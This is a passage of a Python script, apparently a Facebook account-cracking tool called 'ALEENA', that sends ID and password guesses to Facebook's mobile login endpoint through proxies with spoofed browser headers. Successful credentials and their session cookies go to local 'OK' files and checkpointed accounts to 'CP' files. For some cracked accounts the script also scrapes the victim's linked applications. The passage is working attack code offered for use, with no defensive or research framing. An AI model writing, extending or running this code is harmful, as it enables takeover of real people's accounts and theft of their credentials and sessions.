			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}

			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			if "checkpoint" in po.cookies.get_dict().keys():

				if 'ya' in oprek:

					akun.append(idf+'|'+pw)

					ceker(idf,pw)

				elif 'ya' in princp:

					print('\n')

					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'

					statuscp1 = nel(statuscp, style='red')

					cetak(statuscp1, title='ALEENA-CP🔪')

					open('/sdcard/ALEENA-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')

					akun.append(idf+'|'+pw)

					cp+=1

				else:continue

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}

				if 'no' in taplikasi:

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('/sdcard/ALEENA-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					print('\n')

					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'

					statusok1 = nel(statusok, style='green')

					cetak(nel(statusok1, title='OK'))

					ok+=1

					break

				elif 'ya' in taplikasi:

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('/sdcard/ALEENA-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					user=idf

					infoakun = ""

					session = requests.Session()

					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text

					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text

					infoakun += (f"\n[bold cyan][•] ACTIVE APPLICATIONS :[/bold cyan] \n")

					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))

					nok=1

					for muncul in apkaktif:

						infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")

						nok+=1

					hit=0

					infoakun += (f"\n[bold yellow][•] EXPIRED APPLICATIONS :[/bold yellow]\n")

					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))

					hit=0

					for muncul in apkexp:

						hit+=1

						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")

					print('\n')

					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'

					statusok1 = nel(statusok, style='green')

					cetak(nel(statusok1, title='[bold green]ALEENA-OK🔥[/bold green]'))

					ok+=1

					break

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':

	try:os.system('git pull')

	except:pass

	try:os.mkdir('OK')

	except:pass

	try:os.mkdir('CP')

	except:pass

	try:os.mkdir('DUMP')

	except:pass

	try:os.system('touch .prox.txt')

	except:pass

	login()

	

#>>>>> THANKS TO USE MY TOOL <<<<<<<#

#>>>>> SSG<<<<<#
